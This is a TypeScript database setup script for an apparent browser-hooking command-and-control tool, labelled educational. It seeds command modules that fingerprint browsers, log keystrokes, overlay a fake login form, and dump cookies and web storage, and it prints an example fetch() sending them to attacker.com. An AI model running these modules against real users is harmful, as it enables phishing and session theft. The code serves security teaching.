import { Pool } from '@neondatabase/serverless';
import { drizzle } from 'drizzle-orm/neon-serverless';
import { migrate } from 'drizzle-orm/neon-serverless/migrator';
import * as schema from '../shared/schema';
import { 
  commandModules, 
  type InsertCommandModule 
} from '../shared/schema';

// Connect to the database
console.log('Connecting to database...');
if (!process.env.DATABASE_URL) {
  throw new Error('DATABASE_URL environment variable is not set');
}

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const db = drizzle(pool, { schema });

async function pushSchema() {
  try {
    console.log('Pushing schema to database...');
    
    // Create tables if they don't exist based on our Drizzle schema
    await db.execute(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username TEXT NOT NULL UNIQUE,
        password_hash TEXT NOT NULL
      );
      
      CREATE TABLE IF NOT EXISTS hooked_browsers (
        id SERIAL PRIMARY KEY,
        session_id TEXT NOT NULL UNIQUE,
        ip_address TEXT NOT NULL,
        user_agent TEXT NOT NULL,
        browser TEXT,
        browser_version TEXT,
        os TEXT,
        platform TEXT,
        is_online BOOLEAN DEFAULT TRUE,
        first_seen TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        last_seen TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        is_active BOOLEAN DEFAULT TRUE,
        page_uri TEXT,
        page_title TEXT,
        headers JSONB
      );
      
      CREATE TABLE IF NOT EXISTS command_modules (
        id SERIAL PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        category TEXT NOT NULL,
        icon TEXT,
        code TEXT NOT NULL
      );
      
      CREATE TABLE IF NOT EXISTS command_executions (
        id SERIAL PRIMARY KEY,
        browser_id INTEGER NOT NULL REFERENCES hooked_browsers(id) ON DELETE CASCADE,
        module_id INTEGER NOT NULL REFERENCES command_modules(id) ON DELETE CASCADE,
        status TEXT NOT NULL,
        executed_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        result JSONB
      );
      
      CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        browser_id INTEGER REFERENCES hooked_browsers(id) ON DELETE SET NULL,
        event TEXT NOT NULL,
        level TEXT NOT NULL,
        timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
        details JSONB
      );
    `);

    // Initialize default command modules
    await initializeDefaultCommandModules();
    
    console.log('Schema pushed successfully');
  } catch (error) {
    console.error('Failed to push schema:', error);
    throw error;
  } finally {
    await pool.end();
  }
}

// Initialize default command modules if they don't exist
async function initializeDefaultCommandModules() {
  try {
    // Check if command modules already exist
    const existingModules = await db.select().from(commandModules);
    
    if (existingModules.length === 0) {
      console.log('Initializing default command modules...');
      
      const defaultModules: InsertCommandModule[] = [
        {
          name: 'Get Browser Details',
          description: 'Retrieve detailed information about the hooked browser',
          category: 'Information Gathering',
          icon: 'info',
          code: `
            (() => {
              // Educational demonstration only
              const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                screen: {
                  width: screen.width,
                  height: screen.height,
                  availWidth: screen.availWidth,
                  availHeight: screen.availHeight,
                  colorDepth: screen.colorDepth,
                  pixelDepth: screen.pixelDepth
                }
              };
              return browserInfo;
            })();
          `
        },
        {
          name: 'Get Installed Plugins',
          description: 'List all browser plugins and extensions',
          category: 'Information Gathering',
          icon: 'info',
          code: `
            (() => {
              // Educational demonstration only
              const plugins = [];
              if (navigator.plugins) {
                for(let i = 0; i < navigator.plugins.length; i++) {
                  const plugin = navigator.plugins[i];
                  plugins.push({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                  });
                }
              }
              return { plugins };
            })();
          `
        },
        {
          name: 'Get System Information',
          description: 'Gather information about the system running the browser',
          category: 'Information Gathering',
          icon: 'info',
          code: `
            (() => {
              // Educational demonstration only
              return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenResolution: {
                  width: screen.width,
                  height: screen.height
                },
                colorDepth: screen.colorDepth,
                devicePixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || 'unknown'
              };
            })();
          `
        },
        {
          name: 'Keystroke Logger (Educational)',
          description: 'Demonstrate how keystroke logging works in a controlled environment',
          category: 'Information Gathering',
          icon: 'keyboard',
          code: `
            (() => {
              // Educational demonstration only
              let keystrokes = [];
              let isLogging = false;
              
              // Create UI elements
              const loggerDiv = document.createElement('div');
              loggerDiv.id = 'xss-keylogger-demo';
              loggerDiv.style.position = 'fixed';
              loggerDiv.style.bottom = '20px';
              loggerDiv.style.right = '20px';
              loggerDiv.style.width = '300px';
              loggerDiv.style.padding = '15px';
              loggerDiv.style.backgroundColor = '#f8f9fa';
              loggerDiv.style.border = '1px solid #ddd';
              loggerDiv.style.borderRadius = '5px';
              loggerDiv.style.boxShadow = '0 0 10px rgba(0,0,0,0.1)';
              loggerDiv.style.zIndex = '9999';
              loggerDiv.style.fontFamily = 'Arial, sans-serif';
              
              loggerDiv.innerHTML = \`
                <div style="margin-bottom:10px; font-weight:bold; color:#721c24; background-color:#f8d7da; padding:5px; border-radius:3px; text-align:center;">
                  EDUCATIONAL KEYSTROKE LOGGER DEMO
                </div>
                <div style="margin-bottom:10px;">
                  <button id="start-logging" style="padding:5px 10px; background:#28a745; color:white; border:none; border-radius:3px; cursor:pointer; margin-right:5px;">Start Demo</button>
                  <button id="stop-logging" style="padding:5px 10px; background:#dc3545; color:white; border:none; border-radius:3px; cursor:pointer; display:none;">Stop Demo</button>
                </div>
                <div style="font-size:12px; margin-bottom:10px;">Type in the field below to see keylogging in action:</div>
                <input type="text" id="demo-input" style="width:100%; padding:5px; margin-bottom:10px; border:1px solid #ced4da; border-radius:3px;" placeholder="Type here...">
                <div style="font-size:12px; margin-bottom:5px;">Captured keystrokes:</div>
                <div id="keystroke-log" style="height:100px; overflow-y:auto; border:1px solid #ced4da; padding:5px; font-family:monospace; font-size:12px; background:#f5f5f5;">
                  Click "Start Demo" to begin...
                </div>
                <div style="font-size:11px; margin-top:10px; color:#6c757d;">For educational purposes only. In real-world attacks, this would happen invisibly.</div>
              \`;
              
              document.body.appendChild(loggerDiv);
              
              // Set up event handlers
              document.getElementById('start-logging').addEventListener('click', function() {
                document.getElementById('start-logging').style.display = 'none';
                document.getElementById('stop-logging').style.display = 'inline-block';
                document.getElementById('keystroke-log').innerHTML = 'Logging started...<br>';
                keystrokes = [];
                isLogging = true;
              });
              
              document.getElementById('stop-logging').addEventListener('click', function() {
                document.getElementById('stop-logging').style.display = 'none';
                document.getElementById('start-logging').style.display = 'inline-block';
                isLogging = false;
                document.getElementById('keystroke-log').innerHTML += '<br>Logging stopped.<br>';
              });
              
              // Set up the keylogger
              function handleKeyPress(e) {
                if (!isLogging) return;
                
                const key = e.key;
                const target = e.target.tagName;
                const timestamp = new Date().toLocaleTimeString();
                
                keystrokes.push({key, target, timestamp});
                
                let logElement = document.getElementById('keystroke-log');
                logElement.innerHTML += \`[\${timestamp}] \${key}<br>\`;
                logElement.scrollTop = logElement.scrollHeight;
              }
              
              // Only log keys from the demo input to be ethical
              document.getElementById('demo-input').addEventListener('keydown', handleKeyPress);
              
              return { success: true, message: 'Keystroke logger demonstration activated' };
            })();
          `
        },
        {
          name: 'Fake Login Phishing Demo',
          description: 'Demonstrate how phishing attacks can steal credentials',
          category: 'Social Engineering',
          icon: 'login',
          code: `
            (() => {
              // Educational demonstration only
              // Create a fake login overlay
              const overlay = document.createElement('div');
              overlay.style.position = 'fixed';
              overlay.style.top = '0';
              overlay.style.left = '0';
              overlay.style.width = '100%';
              overlay.style.height = '100%';
              overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
              overlay.style.zIndex = '10000';
              overlay.style.display = 'flex';
              overlay.style.justifyContent = 'center';
              overlay.style.alignItems = 'center';
              overlay.style.fontFamily = 'Arial, sans-serif';
              
              // Create the phishing form
              const formBox = document.createElement('div');
              formBox.style.width = '350px';
              formBox.style.padding = '20px';
              formBox.style.backgroundColor = 'white';
              formBox.style.borderRadius = '5px';
              formBox.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
              
              formBox.innerHTML = \`
                <div style="background-color:#f8d7da; padding:10px; margin-bottom:15px; border-radius:3px; text-align:center;">
                  <strong style="color:#721c24">EDUCATIONAL PHISHING DEMO</strong>
                  <p style="font-size:12px; margin:5px 0 0 0;">This is a demonstration of how phishing attacks work.</p>
                  <p style="font-size:12px; margin:5px 0 0 0;">No information is being sent to any server.</p>
                </div>
                <h2 style="margin-top:0; color:#333; text-align:center;">Session Expired</h2>
                <p style="color:#666; margin-bottom:20px;">Please re-enter your credentials to continue.</p>
                <form id="fake-login-form">
                  <div style="margin-bottom:15px;">
                    <label style="display:block; margin-bottom:5px; color:#333;">Username or Email</label>
                    <input type="text" id="fake-username" style="width:100%; padding:8px; border:1px solid #ddd; border-radius:3px;" placeholder="Enter your username">
                  </div>
                  <div style="margin-bottom:20px;">
                    <label style="display:block; margin-bottom:5px; color:#333;">Password</label>
                    <input type="password" id="fake-password" style="width:100%; padding:8px; border:1px solid #ddd; border-radius:3px;" placeholder="Enter your password">
                  </div>
                  <div style="display:flex; justify-content:space-between; align-items:center;">
                    <button type="submit" style="background-color:#0066cc; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer;">Login</button>
                    <button id="demo-close" style="background-color:#dc3545; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer;">Close Demo</button>
                  </div>
                </form>
                <p style="font-size:11px; color:#999; margin-top:20px; text-align:center;">For educational purposes only.</p>
              \`;
              
              overlay.appendChild(formBox);
              document.body.appendChild(overlay);
              
              // Captured credentials (for educational purposes only)
              let capturedCredentials = null;
              
              // Event handlers
              document.getElementById('fake-login-form').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('fake-username').value;
                const password = document.getElementById('fake-password').value;
                
                // Store credentials (for demonstration only)
                capturedCredentials = { username, password };
                
                // Show captured credentials
                formBox.innerHTML = \`
                  <div style="background-color:#f8d7da; padding:10px; margin-bottom:15px; border-radius:3px; text-align:center;">
                    <strong style="color:#721c24">EDUCATIONAL PHISHING DEMO</strong>
                  </div>
                  <h2 style="margin-top:0; color:#333; text-align:center;">Phishing Demonstration</h2>
                  <p style="color:#666; margin-bottom:10px;">In a real attack, the following credentials would have been sent to an attacker:</p>
                  <div style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px;">
                    <p style="margin:5px 0;"><strong>Username:</strong> \${username}</p>
                    <p style="margin:5px 0;"><strong>Password:</strong> \${password}</p>
                  </div>
                  <p style="color:#666; margin-bottom:20px;">This is how easily credentials can be stolen through phishing attacks.</p>
                  <button id="demo-close2" style="background-color:#dc3545; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer; width:100%;">Close Demo</button>
                  <p style="font-size:11px; color:#999; margin-top:20px; text-align:center;">For educational purposes only.</p>
                \`;
                
                document.getElementById('demo-close2').addEventListener('click', function() {
                  document.body.removeChild(overlay);
                });
              });
              
              document.getElementById('demo-close').addEventListener('click', function() {
                document.body.removeChild(overlay);
              });
              
              return { success: true, message: 'Phishing demonstration activated' };
            })();
          `
        },
        {
          name: 'Page Redirect Demo',
          description: 'Demonstrate how XSS can be used to redirect users to other websites',
          category: 'Social Engineering',
          icon: 'link',
          code: `
            (() => {
              // Educational demonstration only
              const overlay = document.createElement('div');
              overlay.style.position = 'fixed';
              overlay.style.top = '0';
              overlay.style.left = '0';
              overlay.style.width = '100%';
              overlay.style.height = '100%';
              overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
              overlay.style.zIndex = '10000';
              overlay.style.display = 'flex';
              overlay.style.justifyContent = 'center';
              overlay.style.alignItems = 'center';
              overlay.style.fontFamily = 'Arial, sans-serif';
              
              const dialogBox = document.createElement('div');
              dialogBox.style.width = '400px';
              dialogBox.style.padding = '20px';
              dialogBox.style.backgroundColor = 'white';
              dialogBox.style.borderRadius = '5px';
              dialogBox.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
              
              dialogBox.innerHTML = \`
                <div style="background-color:#f8d7da; padding:10px; margin-bottom:15px; border-radius:3px; text-align:center;">
                  <strong style="color:#721c24">EDUCATIONAL REDIRECT DEMO</strong>
                  <p style="font-size:12px; margin:5px 0 0 0;">This demonstrates how XSS can redirect users.</p>
                </div>
                <h2 style="margin-top:0; color:#333; text-align:center;">Demonstration: Page Redirection</h2>
                <p style="color:#666; margin-bottom:15px;">In a real XSS attack, the attacker could redirect you to:</p>
                <ul style="color:#666; margin-bottom:15px;">
                  <li>A phishing site that looks identical to the real site</li>
                  <li>A malware download page</li>
                  <li>A site that attempts to exploit browser vulnerabilities</li>
                </ul>
                <p style="color:#666; margin-bottom:20px;">Instead of actually redirecting you, this demo just shows you what could happen.</p>
                
                <div style="display:flex; justify-content:space-between;">
                  <button id="simulate-redirect" style="background-color:#0066cc; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer;">Simulate Redirect</button>
                  <button id="redirect-close" style="background-color:#dc3545; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer;">Close Demo</button>
                </div>
                <p style="font-size:11px; color:#999; margin-top:20px; text-align:center;">For educational purposes only.</p>
              \`;
              
              overlay.appendChild(dialogBox);
              document.body.appendChild(overlay);
              
              // Simulate redirect
              document.getElementById('simulate-redirect').addEventListener('click', function() {
                dialogBox.innerHTML = \`
                  <div style="background-color:#f8d7da; padding:10px; margin-bottom:15px; border-radius:3px; text-align:center;">
                    <strong style="color:#721c24">EDUCATIONAL REDIRECT DEMO</strong>
                  </div>
                  <h2 style="margin-top:0; color:#333; text-align:center;">Redirect Simulated</h2>
                  <p style="color:#666; margin-bottom:15px;">In a real attack, your browser would now be at:</p>
                  <div style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px; word-break:break-all;">
                    <p style="margin:5px 0;">https://malicious-site.example.com/fake-login</p>
                  </div>
                  <p style="color:#666; margin-bottom:20px;">The code for this would be as simple as:</p>
                  <pre style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px; overflow-x:auto;">window.location = "https://malicious-site.example.com";</pre>
                  <button id="redirect-close2" style="background-color:#dc3545; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer; width:100%;">Close Demo</button>
                  <p style="font-size:11px; color:#999; margin-top:20px; text-align:center;">For educational purposes only.</p>
                \`;
                
                document.getElementById('redirect-close2').addEventListener('click', function() {
                  document.body.removeChild(overlay);
                });
              });
              
              document.getElementById('redirect-close').addEventListener('click', function() {
                document.body.removeChild(overlay);
              });
              
              return { success: true, message: 'Redirect demonstration activated' };
            })();
          `
        },
        {
          name: 'Token Stealing Demo',
          description: 'Demonstrate how XSS can be used to steal authentication tokens',
          category: 'Information Gathering',
          icon: 'key',
          code: `
            (() => {
              // Educational demonstration only
              // Create UI for demonstration
              const overlay = document.createElement('div');
              overlay.style.position = 'fixed';
              overlay.style.top = '0';
              overlay.style.left = '0';
              overlay.style.width = '100%';
              overlay.style.height = '100%';
              overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
              overlay.style.zIndex = '10000';
              overlay.style.display = 'flex';
              overlay.style.justifyContent = 'center';
              overlay.style.alignItems = 'center';
              overlay.style.fontFamily = 'Arial, sans-serif';
              
              const dialogBox = document.createElement('div');
              dialogBox.style.width = '450px';
              dialogBox.style.padding = '20px';
              dialogBox.style.backgroundColor = 'white';
              dialogBox.style.borderRadius = '5px';
              dialogBox.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
              dialogBox.style.maxHeight = '80vh';
              dialogBox.style.overflowY = 'auto';
              
              // Get actual cookies for demonstration
              const cookies = document.cookie;
              const localStorageItems = { ...localStorage };
              const sessionStorageItems = { ...sessionStorage };
              
              // Format storage for display
              function formatStorage(storage) {
                if (Object.keys(storage).length === 0) {
                  return '(empty)';
                }
                let result = '';
                for (const key in storage) {
                  result += '<div style="margin-bottom:5px;">';
                  result += `<strong>${key}:</strong> ${storage[key]}`;
                  result += '</div>';
                }
                return result;
              }
              
              dialogBox.innerHTML = \`
                <div style="background-color:#f8d7da; padding:10px; margin-bottom:15px; border-radius:3px; text-align:center;">
                  <strong style="color:#721c24">EDUCATIONAL TOKEN STEALING DEMO</strong>
                  <p style="font-size:12px; margin:5px 0 0 0;">This demonstrates how sensitive data can be accessed.</p>
                </div>
                <h2 style="margin-top:0; color:#333; text-align:center;">Token/Cookie Stealing</h2>
                <p style="color:#666; margin-bottom:15px;">In a real XSS attack, sensitive data like authentication tokens stored in cookies or localStorage could be stolen.</p>
                
                <h3 style="color:#333; margin-top:20px;">Your Cookies:</h3>
                <div style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px; font-size:12px;">
                  ${cookies ? cookies : '(no cookies found)'}
                </div>
                
                <h3 style="color:#333; margin-top:20px;">Your localStorage:</h3>
                <div style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px; font-size:12px;">
                  ${formatStorage(localStorageItems)}
                </div>
                
                <h3 style="color:#333; margin-top:20px;">Your sessionStorage:</h3>
                <div style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px; font-size:12px;">
                  ${formatStorage(sessionStorageItems)}
                </div>
                
                <p style="color:#666; margin-bottom:15px;">The code to steal this data can be as simple as:</p>
                <pre style="background-color:#f5f5f5; padding:10px; border-radius:3px; font-family:monospace; margin-bottom:20px; overflow-x:auto; font-size:12px;">
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  })
});</pre>
                
                <button id="token-close" style="background-color:#dc3545; color:white; border:none; padding:10px 15px; border-radius:3px; cursor:pointer; width:100%;">Close Demo</button>
                <p style="font-size:11px; color:#999; margin-top:20px; text-align:center;">For educational purposes only.</p>
              \`;
              
              overlay.appendChild(dialogBox);
              document.body.appendChild(overlay);
              
              document.getElementById('token-close').addEventListener('click', function() {
                document.body.removeChild(overlay);
              });
              
              return { success: true, message: 'Token stealing demonstration activated' };
            })();
          `
        }
      ];
      
      // Insert the default modules
      for (const module of defaultModules) {
        await db.insert(commandModules).values(module);
      }
      
      console.log(`Initialized ${defaultModules.length} default command modules`);
    } else {
      console.log(`Found ${existingModules.length} existing command modules, skipping initialization`);
    }
  } catch (error) {
    console.error('Failed to initialize default command modules:', error);
    throw error;
  }
}

// Run the schema push
pushSchema().catch(error => {
  console.error('Schema push failed:', error);
  process.exit(1);
});